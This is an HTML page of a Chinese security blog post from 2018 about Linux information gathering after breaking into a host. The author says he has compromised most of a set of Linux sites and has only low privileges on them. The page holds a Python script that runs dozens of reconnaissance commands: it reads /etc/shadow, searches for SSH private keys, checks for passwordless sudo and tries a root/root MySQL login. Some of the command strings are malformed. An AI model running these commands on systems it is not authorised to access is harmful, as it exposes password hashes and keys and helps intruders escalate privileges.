<!DOCTYPE html>
<html lang=九世>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="description" content="前言：接上一篇的，搞下了大部分的Linux的站。可是权限低的一批，这emmm。。。很无奈，今天早上去给亲戚过生日，晚上Github搜项目，看到一个不错的Linux收集思路。就有了这篇文章。（本子图一张） 正文：思路： 0.首先要获取系统信息： 系统名称 本地ip 主机名 本地dns 环境变量 shell程序 hosts文件 路由信息 arp缓存 计划任务 挂载磁盘 mail目录 history文件">
<meta name="keywords" content="Writing">
<meta property="og:type" content="article">
<meta property="og:title" content="Linux信息收集">
<meta property="og:url" content="http://yoursite.com/2018/08/01/Linux信息收集/index.html">
<meta property="og:site_name" content="九世的博客">
<meta property="og:description" content="前言：接上一篇的，搞下了大部分的Linux的站。可是权限低的一批，这emmm。。。很无奈，今天早上去给亲戚过生日，晚上Github搜项目，看到一个不错的Linux收集思路。就有了这篇文章。（本子图一张） 正文：思路： 0.首先要获取系统信息： 系统名称 本地ip 主机名 本地dns 环境变量 shell程序 hosts文件 路由信息 arp缓存 计划任务 挂载磁盘 mail目录 history文件">
<meta property="og:locale" content="九世">
<meta property="og:image" content="https://ss1.bdstatic.com/70cFuXSh_Q1YnxGkpoWK1HF6hhy/it/u=2419147808,325111347&fm=27&gp=0.jpg">
<meta property="og:image" content="https://i.imgur.com/F4QC5Cs.png">
<meta property="og:image" content="https://i.imgur.com/ap7NSAR.png">
<meta property="og:image" content="https://i.imgur.com/rNcTlqi.png">
<meta property="og:updated_time" content="2018-08-05T03:22:19.852Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Linux信息收集">
<meta name="twitter:description" content="前言：接上一篇的，搞下了大部分的Linux的站。可是权限低的一批，这emmm。。。很无奈，今天早上去给亲戚过生日，晚上Github搜项目，看到一个不错的Linux收集思路。就有了这篇文章。（本子图一张） 正文：思路： 0.首先要获取系统信息： 系统名称 本地ip 主机名 本地dns 环境变量 shell程序 hosts文件 路由信息 arp缓存 计划任务 挂载磁盘 mail目录 history文件">
<meta name="twitter:image" content="https://ss1.bdstatic.com/70cFuXSh_Q1YnxGkpoWK1HF6hhy/it/u=2419147808,325111347&fm=27&gp=0.jpg">
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
          
        
    
    <!-- title -->
    <title>Linux信息收集</title>
    <!-- styles -->
    <link rel="stylesheet" href="/css/style.css">
    <!-- persian styles -->
    
      <link rel="stylesheet" href="/css/rtl.css">
    
    <!-- rss -->
    
    
</head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="http://github.com/422926799">Projectes</a></li>
         
          <li><a href="/Search">Search</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/2018/08/05/hello-world/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/2018/07/31/dedecms远程文件写入漏洞检测/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Post Anterior</span>
      <span id="i-next" class="info" style="display:none;">Post Següent</span>
      <span id="i-top" class="info" style="display:none;">Adalt</span>
      <span id="i-share" class="info" style="display:none;">Compartir Post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2018/08/01/Linux信息收集/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2018/08/01/Linux信息收集/&text=Linux信息收集"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2018/08/01/Linux信息收集/&title=Linux信息收集"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2018/08/01/Linux信息收集/&is_video=false&description=Linux信息收集"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Linux信息收集&body=Check out this article: http://yoursite.com/2018/08/01/Linux信息收集/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2018/08/01/Linux信息收集/&title=Linux信息收集"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2018/08/01/Linux信息收集/&title=Linux信息收集"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2018/08/01/Linux信息收集/&title=Linux信息收集"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2018/08/01/Linux信息收集/&title=Linux信息收集"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2018/08/01/Linux信息收集/&name=Linux信息收集&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言："><span class="toc-number">1.</span> <span class="toc-text">前言：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#正文："><span class="toc-number">2.</span> <span class="toc-text">正文：</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index my4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        Linux信息收集
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">九世的博客</span>
      </span>
      
    <div class="postdate">
        <time datetime="2018-08-01T00:13:22.000Z" itemprop="datePublished">2018-08-01</time>
    </div>


      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link" href="/tags/Writing/">Writing</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>接上一篇的，搞下了大部分的Linux的站。可是权限低的一批，这emmm。。。<br>很无奈，今天早上去给亲戚过生日，晚上Github搜项目，看到一个不错的Linux收集思路。就有了这篇文章。（本子图一张）<br><img src="https://ss1.bdstatic.com/70cFuXSh_Q1YnxGkpoWK1HF6hhy/it/u=2419147808,325111347&amp;fm=27&amp;gp=0.jpg" alt=""></p>
<h1 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h1><p><strong>思路</strong>：</p>
<pre><code>0.首先要获取系统信息：
系统名称
本地ip
主机名
本地dns
环境变量
shell程序
hosts文件
路由信息
arp缓存
计划任务
挂载磁盘
mail目录
history文件
home/root/bin/sbin目录

1.获取用户信息
当前权限
用户信息
本地用户
在线用户
hash加密规则
hash信息
用户组信息
最后登录信息
最后登录用户信息
所有用户的计划任务

2.安全扫描
是否能无密码sudo
conf配置文件
ssh的密钥文件
是否能root登录
敏感配置文件扫描
关键字含有config、web.xml、database、pass的文件
uid为0用户
敏感服务匿名
空密码用户
zip/tar.gz/sh/pl/py/rb/txt/bak后缀文件

3.全部命令放入一个列表里，说明放入一个列表里
4.遍历写入
</code></pre><p>代码：</p>
<pre><code>import os
ml=[&apos;uname -a&apos;,&apos;cat /etc/issue&apos;,&apos;hostname&apos;,&apos;cat /etc/hosts&apos;,&apos;who&apos;,&quot;awk -F &apos;:&apos; &apos;{print $1,$3,$4,$6;}&apos; /etc/passwd&quot;,&apos;cat /etc/group&apos;,&apos;cat /etc/shadow&apos;,&apos;grep -v -E &quot;^#&quot; /etc/passwd&apos;,&apos;cat ~/.bash_history&apos;,&apos;w&apos;,&apos;netstat&apos;,&apos;ps -aux&apos;,&apos;dpkg -l&apos;,&apos;netstat -antpu&apos;,&apos;arp -a&apos;,&apos;uname -a 2&gt;/dev/null&apos;,&apos;hostname&apos;,&apos;lastlog&apos;,&apos;for i in $(cat /etc/passwd 2&gt;/dev/null&apos;,&quot;grep -v &apos;^[^:]*:[x]&apos; /etc/passwd 2&gt;/dev/null&quot;,&apos;grep -v &quot;^#&quot; /etc/passwd&apos;,&apos;cat /etc/shadow 2&gt;/dev/null&apos;,&apos;cat /etc/master.passwd 2&gt;/dev/null&apos;,&apos;echo &apos;&apos;sudo -S -l 2&gt;/dev/null&apos;,&apos;ls -ahl /root/ 2&gt;/dev/null&apos;,&apos;ls -ahl /home/ 2&gt;/dev/null&apos;,&apos;find / -writable -not -user \`whoami\` -type f -not -path &quot;/proc/*&quot; -exec ls -al {} \; 2&gt;/dev/null&apos;,&apos;find / -name &quot;id_dsa*&quot; -o -name &quot;id_rsa*&quot; -o -name &quot;known_hosts&quot; -o -name &quot;authorized_hosts&quot; -o -name &quot;authorized_keys&quot; 2&gt;/dev/null |xargs -r ls&apos;,&apos;&apos;&apos;grep &quot;PermitRootLogin &quot; /etc/ssh/sshd_config 2&gt;/dev/null | grep -v &quot;#&quot; | awk &apos;{print  $2}&apos;&apos;&apos;,&apos;echo $PATH 2&gt;/dev/null&apos;,&apos;cat /etc/shells 2&gt;/dev/null&apos;,&apos;cat /etc/login.defs 2&gt;/dev/null | grep &quot;PASS_MAX_DAYS\|PASS_MIN_DAYS\|PASS_WARN_AGE\|ENCRYPT_METHOD&quot; 2&gt;/dev/null | grep -v &quot;#&quot; 2&gt;/dev/null&apos;,&apos;ls -la /etc/cron* 2&gt;/dev/null&apos;,&apos;cat /etc/crontab 2&gt;/dev/null&apos;,&apos;cat /etc/passwd | cut -d &quot;:&quot; -f 1 | xargs -n1 crontab -l -u 2&gt;/dev/null&apos;,&apos;cat /etc/resolv.conf 2&gt;/dev/null&quot;&apos;,&apos;route 2&gt;/dev/null&apos;,&apos;netstat -antp 2&gt;/dev/null&apos;,&apos;netstat -anup 2&gt;/dev/null&apos;,&apos;ps aux 2&gt;/dev/null&apos;,&quot;ps aux&quot;,&quot;&apos;ls -la /etc/init.d 2&gt;/dev/null&apos;&quot;,&quot;find /etc/init.d/ \! -uid 0 -type f 2&gt;/dev/null&quot;,&quot;mysql --version 2&gt;/dev/null&quot;,&quot;sudo -V 2&gt;/dev/null&quot;,&quot;mysqladmin -uroot -proot version 2&gt;/dev/null&quot;,&quot;psql -V 2&gt;/dev/null&quot;,&quot;apache2 -v 2&gt;/dev/null; httpd -v 2&gt;/dev/null&quot;,&quot;&quot;&quot;awk &apos;{sub(/.*\export /,&quot;&quot;)}1&quot;&quot;&quot;,&apos;ifconfig&apos;]
shuomin=[&apos;内核(是否为x64还是x86)&apos;,&apos;版本&apos;,&apos;主机名&apos;,&apos;hosts&apos;,&apos;目前登录系统的用户信息&apos;,&apos;获取用户名&apos;,&apos;获取用户组&apos;,&apos;获取hash&apos;,&apos;列出超级用户&apos;,&apos;查看用户操作&apos;,&apos;获取在线用户&apos;,&apos;端口&apos;,&apos;进程&apos;,&apos;程序&apos;,&apos;敏感文件&apos;,&apos;交互通信的ip&apos;,&apos;arp缓存&apos;,&apos;基础内核信息&apos;,&apos;主机名&apos;,&apos;最后用户登录的信息&apos;,&apos;列出所有用户的组&apos;,&apos;查询是否有hash存储在/etc/passwd(*nix中)&apos;,&apos;根据uid列出本地用户&apos;,&apos;读取shadow文件&apos;,&apos;bsd的shadow文件&apos;,&apos;能够sudo不需要提供密码&apos;,&apos;检查root目录是否存在&apos;,&apos;显示home目录情况&apos;,&apos;寻找文件我们能写但是不属于我们的文件&apos;,&apos;寻找ssh公钥&apos;,&apos;root是否能登录ssh,如果返回yes则可以登录&apos;,&apos;环境变量&apos;,&apos;列出能用的shells&apos;,&apos;hash的密码加密政策&apos;,&apos;所有的计划任务配置文件&apos;,&apos;获取计划任务内容&apos;,&apos;获取每个用户的计划任务&apos;,&apos;dns设置&apos;,&apos;路由配置&apos;,&apos;正在监听的tcp端口&apos;,&apos;udp端口&apos;,&apos;正在运行的程序&apos;,&apos;查看进程路径和权限&apos;,&apos;获取inetd.conf文件(监视网络的守护进程)&apos;,&apos;列举各种服务的管理脚本&apos;,&apos;寻找不是root的&apos;,&apos;获取mysql版本&apos;,&apos;获取sudo版本&apos;,&apos;测试root/root能否登录&apos;,&apos;postgres版本&apos;,&apos;apache详情&apos;,&apos;apache的运行用户&apos;,&apos;ip&apos;]

def poc():
    xk = open(&apos;save.txt&apos;, &apos;w&apos;)
    xk.close()
    for i in range(0,len(ml)):
        zx=os.popen(ml[i])
        print(&apos;[+]{}&apos;.format(shuomin[i]))
        print(&apos;[+]{}&apos;.format(shuomin[i]),file=open(&apos;save.txt&apos;,&apos;a&apos;))
        for z in zx:
            print(z,file=open(&apos;save.txt&apos;,&apos;a&apos;))
poc()
</code></pre><p>收集结果如下：<br><img src="https://i.imgur.com/F4QC5Cs.png" alt=""></p>
<p><img src="https://i.imgur.com/ap7NSAR.png" alt=""></p>
<p><img src="https://i.imgur.com/rNcTlqi.png" alt=""></p>

  </div>
</article>



    </div>
    
      <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="http://github.com/422926799">Projectes</a></li>
         
          <li><a href="/Search">Search</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言："><span class="toc-number">1.</span> <span class="toc-text">前言：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#正文："><span class="toc-number">2.</span> <span class="toc-text">正文：</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2018/08/01/Linux信息收集/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2018/08/01/Linux信息收集/&text=Linux信息收集"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2018/08/01/Linux信息收集/&title=Linux信息收集"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2018/08/01/Linux信息收集/&is_video=false&description=Linux信息收集"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Linux信息收集&body=Check out this article: http://yoursite.com/2018/08/01/Linux信息收集/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2018/08/01/Linux信息收集/&title=Linux信息收集"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2018/08/01/Linux信息收集/&title=Linux信息收集"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2018/08/01/Linux信息收集/&title=Linux信息收集"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2018/08/01/Linux信息收集/&title=Linux信息收集"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2018/08/01/Linux信息收集/&name=Linux信息收集&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menú</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Compartir</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Cap amunt</a>
    </div>

  </div>
</div>

    
    <footer id="footer">
  <div class="footer-left">
    Copyright &copy; 2018 九世
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="http://github.com/422926799">Projectes</a></li>
         
          <li><a href="/Search">Search</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

</body>
</html>
<!-- styles -->
<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">

<!-- jquery -->
<script src="/lib/jquery/jquery.min.js"></script>
<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
<script src="/js/main.js"></script>
<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Disqus Comments -->


